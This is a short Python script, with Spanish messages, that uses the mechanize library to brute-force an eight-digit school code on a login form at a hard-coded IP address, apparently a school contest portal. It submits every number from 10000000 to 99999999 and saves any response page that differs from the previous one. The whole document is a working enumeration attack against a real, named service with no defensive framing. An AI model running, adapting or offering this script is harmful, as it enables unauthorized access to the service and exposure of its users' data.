# -*- coding: utf-8 -*-
from mechanize import Browser

txt = ""

for x in range(10000000,99999999):
    x = str(x)

    print("Enviando formulario número " + x)

    browser = Browser()

    browser.open("http://147.83.52.79/cangur/login-centre/")

    form = browser.select_form(nr=0)

    while True:
        if len(x) < 8:
            x = "0" + x

        if len(x) == 8:
            break

    browser["school"] = x

    response = browser.submit()

    back = txt

    txt = response.read()

    if txt[3892:] != back[3892:]:
        print("meh   " + x)

        raw_input()

        file = open(x + ".txt", "w")

        file.write(txt[3892:])
        file.close()

    print("Enviado.")
